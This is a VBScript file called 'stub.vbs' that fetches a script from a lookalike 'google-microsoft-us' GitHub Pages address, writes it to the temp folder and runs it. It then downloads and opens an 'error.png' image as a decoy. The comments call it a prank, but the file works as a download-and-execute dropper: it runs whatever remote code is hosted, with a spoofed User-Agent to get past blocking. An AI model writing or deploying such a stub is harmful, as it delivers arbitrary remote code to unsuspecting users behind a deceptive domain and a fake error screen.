' ============================================
' stub.vbs
' Downloads and runs a remote VBS prank,
' then downloads and displays an image.
' ============================================

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
tempFolder = objFSO.GetSpecialFolder(2)   ' %TEMP%

' ---------- CONFIGURE THESE URLS ----------
remoteVBS_URL = "https://google-microsoft-us.github.io/downloads/agta.vbs"
remoteImage_URL = "https://google-microsoft-us.github.io/downloads/error.png"
' ------------------------------------------

' 1. Download the remote prank VBS
' FIX: Changed to ServerXMLHTTP.6.0 to avoid "Access is denied" error
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
http.Open "GET", remoteVBS_URL, False
' FIX: Added User-Agent to prevent GitHub from blocking the request
http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
http.Send

If http.Status <> 200 Then
    MsgBox "Failed to download prank script. HTTP " & http.Status, vbCritical, "Error"
    WScript.Quit
End If

' Save prank to a temp file
vbsTempFile = objFSO.BuildPath(tempFolder, "prank_" & Replace(CStr(Timer), ".", "") & ".vbs")
Set f = objFSO.CreateTextFile(vbsTempFile, True)
f.Write http.responseText
f.Close

' 2. Run the prank VBS and WAIT for it to finish
objShell.Run "wscript.exe " & Chr(34) & vbsTempFile & Chr(34), 1, True

' 3. Download the image (binary safe)
http.Open "GET", remoteImage_URL, False
http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
http.Send

If http.Status = 200 Then
    ' Note: If your image is a .png, change the ".jpg" below to ".png"
    imageTempFile = objFSO.BuildPath(tempFolder, "image_" & Replace(CStr(Timer), ".", "") & ".png")
    
    Dim adoStream
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1          ' adTypeBinary
    adoStream.Open
    adoStream.Write http.responseBody
    adoStream.SaveToFile imageTempFile, 2   ' adSaveCreateOverWrite
    adoStream.Close
    
    ' 4. Display the image in the default viewer
    objShell.Run Chr(34) & imageTempFile & Chr(34), 1, False
Else
    MsgBox "Failed to download image. HTTP " & http.Status, vbExclamation, "Error"
End If

' Optional: delete the temporary prank VBS after running
' objFSO.DeleteFile vbsTempFile, True